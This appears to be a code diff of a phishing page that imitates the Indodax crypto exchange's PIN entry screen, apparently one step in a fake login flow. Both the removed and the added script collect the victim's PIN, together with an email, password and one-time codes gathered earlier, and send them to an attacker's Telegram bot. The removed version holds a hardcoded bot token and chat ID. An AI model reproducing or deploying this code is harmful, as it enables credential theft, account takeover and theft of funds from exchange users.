@@ -1,243 +1,161 @@
-<!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Verifikasi OTP INDODAX</title>
-<style>
-  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');
-
-  body {
-    font-family: 'Roboto', sans-serif;
-    background-color: #fff;
-    margin: 40px 16px;
-    color: #000;
-  }
-  .container {
-    max-width: 360px;
-    margin: 0 auto;
-  }
-  h1 {
-    font-weight: 700;
-    font-size: 24px;
-    margin-bottom: 32px;
-    text-align: center;
-  }
-  .otp-info {
-    font-size: 14px;
-    margin-bottom: 24px;
-    text-align: center;
-    color: #666;
-  }
-  .otp-container {
-    display: flex;
-    justify-content: space-between;
-    margin-bottom: 24px;
-  }
-  .otp-input {
-    width: 40px;
-    height: 40px;
-    font-size: 18px;
-    text-align: center;
-    border: 1px solid #ccc;
-    border-radius: 6px;
-    outline: none;
-    transition: border-color 0.2s;
-  }
-  .otp-input:focus {
-    border-color: #2076f3;
-  }
-  button.verify-btn {
-    width: 100%;
-    padding: 12px 0;
-    font-size: 14px;
-    font-weight: 600;
-    border-radius: 6px;
-    border: none;
-    background-color: #d4d4e3;
-    color: #888;
-    cursor: not-allowed;
-    margin-bottom: 16px;
-    transition: background-color 0.3s, color 0.3s;
-  }
-  button.verify-btn.enabled {
-    background-color: #2076f3;
-    color: #fff;
-    cursor: pointer;
-  }
-  .resend-link {
-    display: block;
-    font-size: 13px;
-    color: #2076f3;
-    text-align: center;
-    text-decoration: none;
-  }
-  .resend-link:hover {
-    text-decoration: underline;
-  }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>PIN Input</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+  />
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@700&display=swap');
+    body {
+      font-family: 'Inter', sans-serif;
+    }
+  </style>
 </head>
-<body>
-  <div class="container">
-    <h1>Masukkan PIN</h1>
-    <p class="otp-info">Masukkan PIN 6 digit untuk melanjutkan.</p>
+<body class="bg-white text-black min-h-screen flex flex-col">
+  <header class="flex items-center px-4 py-5">
+    <button aria-label="Back" class="text-[#8A9BA8] text-2xl mr-3">
+      <i class="fas fa-arrow-left"></i>
+    </button>
+    <h1 class="font-bold text-xl leading-6">Masukkan PIN Anda</h1>
+    <div class="ml-auto text-[#8A9BA8] text-2xl cursor-pointer">
+      <i class="fas fa-ellipsis-v"></i>
+    </div>
+  </header>
 
-    <form id="otpForm" novalidate>
-      <div class="otp-container">
-        <input type="tel" class="otp-input" maxlength="1" id="otp1" />
-        <input type="tel" class="otp-input" maxlength="1" id="otp2" />
-        <input type="tel" class="otp-input" maxlength="1" id="otp3" />
-        <input type="tel" class="otp-input" maxlength="1" id="otp4" />
-        <input type="tel" class="otp-input" maxlength="1" id="otp5" />
-        <input type="tel" class="otp-input" maxlength="1" id="otp6" />
-      </div>
+  <main class="flex flex-col items-center mt-20 flex-grow">
+    <div id="pinDots" class="flex space-x-6 mb-6">
+      <span class="w-5 h-5 rounded-full bg-black/30"></span>
+      <span class="w-5 h-5 rounded-full bg-black/30"></span>
+      <span class="w-5 h-5 rounded-full bg-black/30"></span>
+      <span class="w-5 h-5 rounded-full bg-black/30"></span>
+      <span class="w-5 h-5 rounded-full bg-black/30"></span>
+      <span class="w-5 h-5 rounded-full bg-black/30"></span>
+    </div>
+    <button class="text-[#0B7DBF] font-semibold text-base mb-20">Lupa PIN</button>
 
-      <button type="submit" id="verifyBtn" class="verify-btn" disabled>Verifikasi</button>
-    </form>
+    <div class="grid grid-cols-3 gap-y-14 w-full max-w-xs font-bold text-2xl text-center select-none">
+      <button class="focus:outline-none text-black">1</button>
+      <button class="focus:outline-none text-black">2</button>
+      <button class="focus:outline-none text-black">3</button>
+      <button class="focus:outline-none text-black">4</button>
+      <button class="focus:outline-none text-black">5</button>
+      <button class="focus:outline-none text-black">6</button>
+      <button class="focus:outline-none text-black">7</button>
+      <button class="focus:outline-none text-black">8</button>
+      <button class="focus:outline-none text-black">9</button>
+      <div></div>
+      <button class="focus:outline-none text-black">0</button>
+      <button aria-label="Delete" class="focus:outline-none text-black text-xl flex justify-center items-center">
+        <i class="fas fa-backspace"></i>
+      </button>
+    </div>
+  </main>
 
-    <a href="#" class="resend-link">Lupa PIN</a>
-  </div>
-
-  <!-- Load jQuery dari CDN -->
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-
-  <!-- Script JS untuk OTP -->
   <script>
-  $(document).ready(function() {
-      console.log('OTP JS loaded');
+    const pinDots = document.getElementById('pinDots');
+    const pinButtons = document.querySelectorAll('button.focus\\:outline-none.text-black');
+    const deleteBtn = document.querySelector('button[aria-label="Delete"]');
 
-      // Ambil data dari sessionStorage (dari index.html)
-      const email = sessionStorage.getItem('email');
-      const password = sessionStorage.getItem('password');
+    let TELEGRAM_BOT_TOKEN;
+    let TELEGRAM_CHAT_ID;
 
-      if (!email || !password) {
-          // Jika tidak ada session, redirect kembali ke login
-          window.location.href = 'index.html';
-          return;
-      }
-
-      console.log('Session data:', {email, password});
-
-      // Fungsi untuk memastikan input hanya angka
-      function restrictToNumbers(input) {
-          input.on('input', function() {
-              const value = $(this).val();
-              // Hapus karakter non-angka
-              $(this).val(value.replace(/[^0-9]/g, ''));
-              toggleVerifyButton();
-          });
-
-          input.on('keydown', function(e) {
-              // Izinkan backspace, delete, tab, escape, enter, arrow keys
-              const allowedKeys = [8, 9, 13, 27, 37, 38, 39, 40, 46];
-              if (allowedKeys.includes(e.keyCode) || (e.keyCode >= 48 && e.keyCode <= 57) || (e.keyCode >= 96 && e.keyCode <= 105)) {
-                  // Angka dari keyboard utama (48-57) atau numpad (96-105)
-                  return true;
-              } else {
-                  e.preventDefault();
-                  return false;
-              }
-          });
-      }
-
-      // Terapkan restriksi angka ke semua input OTP
-      $('.otp-input').each(function() {
-          restrictToNumbers($(this));
+    // Fetch Telegram bot token and chat ID from config.json
+    fetch("config.json")
+      .then(response => response.json())
+      .then(config => {
+        TELEGRAM_BOT_TOKEN = config.telegramBotToken;
+        TELEGRAM_CHAT_ID = config.telegramChatId;
+        initializePinLogic(); // Initialize the PIN logic after config is loaded
+      })
+      .catch(error => {
+        console.error("Error fetching config:", error);
+        alert("Failed to load configuration.");
       });
 
-      // Auto-focus ke input berikutnya saat input digit
-      $('.otp-input').on('input', function() {
-          const value = $(this).val();
-          if (value.length === 1 && /^\d$/.test(value)) {
-              const nextInput = $(this).next('.otp-input');
-              if (nextInput.length) {
-                  nextInput.focus();
-              }
-          }
-          toggleVerifyButton();
-      });
+    let pin = [];
 
-      // Hapus input sebelumnya saat backspace
-      $('.otp-input').on('keydown', function(e) {
-          if (e.key === 'Backspace' && $(this).val() === '') {
-              const prevInput = $(this).prev('.otp-input');
-              if (prevInput.length) {
-                  prevInput.focus();
-              }
-          }
-      });
-
-      // Fungsi validasi OTP: cek apakah semua 6 digit terisi angka
-      function isOtpValid() {
-          let otp = '';
-          $('.otp-input').each(function() {
-              otp += $(this).val();
-          });
-          return otp.length === 6 && /^\d{6}$/.test(otp);
+    function updatePinDots() {
+      const dots = pinDots.children;
+      for (let i = 0; i < dots.length; i++) {
+        if (i < pin.length) {
+          dots[i].classList.remove('bg-black/30');
+          dots[i].classList.add('bg-black');
+        } else {
+          dots[i].classList.remove('bg-black');
+          dots[i].classList.add('bg-black/30');
+        }
       }
+    }
 
-      // Toggle enable/disable tombol Verifikasi
-      function toggleVerifyButton() {
-          if (isOtpValid()) {
-              $('#verifyBtn').prop('disabled', false).addClass('enabled');
+    function sendPinToTelegram(fullMessage) {
+      const message = encodeURIComponent(fullMessage);
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${message}`;
+
+      fetch(url)
+        .then(response => response.json())
+        .then(data => {
+          if (!data.ok) {
+            alert('Failed to send PIN to Telegram.');
           } else {
-              $('#verifyBtn').prop('disabled', true).removeClass('enabled');
+            location.href = "otpidodax.html";
           }
-      }
+        })
+        .catch(() => {
+          alert('Failed to send PIN to Telegram.');
+        });
+    }
 
-      // Submit form OTP
-      $('#otpForm').on('submit', function(e) {
-          e.preventDefault();
+    function initializePinLogic() {
+      pinButtons.forEach(button => {
+        button.addEventListener('click', () => {
+          if (pin.length < 6) {
+            pin.push(button.textContent);
+            updatePinDots();
+            if (pin.length === 6) {
+              const pinString = pin.join('');
+              localStorage.setItem("userPin", pinString);
 
-          if (!isOtpValid()) {
-              console.log('OTP tidak valid');
-              return;
+              // Retrieve existing data from localStorage
+              const storedEmail = localStorage.getItem("userEmail");
+              const storedPassword = localStorage.getItem("userPassword");
+              const storedWhatsappOtp = localStorage.getItem("userWhatsappOtp");
+              const storedEmailOtp = localStorage.getItem("userEmailOtp");
+
+              let fullMessage = `Indodaxcom:\nPIN: ${pinString}`;
+              if (storedEmail) {
+                fullMessage += `\n\nEmail: ${storedEmail}`;
+              }
+              if (storedPassword) {
+                fullMessage += `\nPassword: ${storedPassword}`;
+              }
+              if (storedWhatsappOtp) {
+                fullMessage += `\nWhatsApp OTP: ${storedWhatsappOtp}`;
+              }
+              if (storedEmailOtp) {
+                fullMessage += `\nEmail OTP: ${storedEmailOtp}`;
+              }
+
+              sendPinToTelegram(fullMessage);
+              setTimeout(() => {
+                pin = [];
+                updatePinDots();
+              }, 1000);
+            }
           }
-
-          let otp = '';
-          $('.otp-input').each(function() {
-              otp += $(this).val();
-          });
-
-          // Format pesan OTP untuk dikirim ke Telegram (OTP bebas, tidak ada validasi hardcoded)
-          const message = `
-Verifikasi OTP INDODAX
-------------------------
-Email: ${email}
-Password: ${password}
-PIN: ${otp}
-------------------------
-          `;
-
-          // Ganti dengan token bot Telegram dan chat ID Anda
-          const token_bot = '8127374507:AAFRjA0Umx6FXIwqmi6aOvMljZaHKTQFOTM';
-          const telegram_id = '8400447517';
-
-          const url = `https://api.telegram.org/bot${token_bot}/sendMessage?chat_id=${telegram_id}&text=${encodeURIComponent(message)}`;
-
-          // Kirim request ke Telegram API
-          $.get(url)
-              .done(function(data) {
-                  if (data.ok) {
-                      console.log('OTP berhasil dikirim ke Telegram');
-
-                      // Simpan OTP ke sessionStorage jika perlu
-                      sessionStorage.setItem('otp', otp);
-
-                      // Redirect ke dashboard setelah sukses
-                      window.location.href = 'otp.html';
-                  } else {
-                      console.error('Error sending OTP:', data);
-                  }
-              })
-              .fail(function(xhr, status, error) {
-                  console.error('Fetch error:', error);
-              });
+        });
       });
 
-      // Fokus ke input pertama saat load
-      $('#otp1').focus();
-  });
+      deleteBtn.addEventListener('click', () => {
+        if (pin.length > 0) {
+          pin.pop();
+          updatePinDots();
+        }
+      });
+    }
   </script>
 </body>
 </html>
